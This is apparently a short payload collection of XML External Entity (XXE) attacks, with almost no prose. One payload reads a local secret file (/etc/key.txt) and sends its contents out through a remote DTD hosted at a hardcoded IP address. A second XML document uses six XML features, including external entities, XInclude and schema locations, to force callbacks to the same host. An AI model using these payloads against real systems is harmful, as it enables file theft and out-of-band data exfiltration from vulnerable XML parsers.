#XXE payload:

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
 <!ENTITY % file SYSTEM "file:///etc/key.txt">
 <!ENTITY % dtd SYSTEM "http://178.62.247.80/combine.dtd">
%dtd;]>
<roottag>&send;</roottag>

# combine.dtd:

<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://178.62.247.80/xxe-payload?%file;'>">
%all;


# XML doc that uses 6 different XML fulns/feats to issue a callback:

<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xml" href="http://178.62.247.80/a.xsl"?>
<!DOCTYPE root PUBLIC "-//A/B/EN" http://178.62.247.80/a.dtd [
  <!ENTITY % remote SYSTEM "http://178.62.247.80/a">
  <!ENTITY xxe SYSTEM "http://178.62.247.80/a">
  %remote;
]>
<root>
  <foo>&xxe;</foo>
  <x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include
    href="http://178.62.247.80/" ></x>
  <y xmlns=http://178.62.247.80/
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://178.62.247.80/
    http://178.62.247.80/a.xsd">a</y>
</root>
